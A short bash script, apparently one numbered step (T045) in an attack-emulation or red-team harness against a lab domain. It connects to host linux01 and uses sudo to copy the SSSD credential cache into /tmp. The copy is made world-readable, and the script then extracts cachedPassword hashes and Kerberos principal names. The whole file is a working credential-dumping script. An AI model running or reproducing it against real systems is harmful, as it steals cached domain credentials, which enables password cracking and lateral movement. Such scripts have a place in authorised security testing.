#!/usr/bin/env bash
# T045 — SSSD ticket/cache extraction on linux01 (via SSH from provisioning)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
echo "=== T045 SSSD on linux01 ==="
REMOTE=$(cat <<'EOF'
set -euo pipefail
echo "=== WT045: SSSD Ticket Extraction ==="
sudo sh -c 'cp /var/lib/sss/db/cache_cadre.local.ldb /tmp/sssd_cache.ldb && chmod 644 /tmp/sssd_cache.ldb' || true
ls -la /tmp/sssd_cache.ldb 2>/dev/null || echo "NO_CACHE"
if command -v ldbsearch >/dev/null 2>&1; then
  ldbsearch -H /tmp/sssd_cache.ldb "(cachedPassword=*)" cachedPassword name 2>/dev/null | head -25 || true
else
  strings /tmp/sssd_cache.ldb 2>/dev/null | grep -iE "cachedPassword|krbPrincipalName" | head -15 || true
fi
echo "T045_DONE"
EOF
)
bash "${LIB}/linux01-exec.sh" "${REMOTE}"
echo "T045 complete"
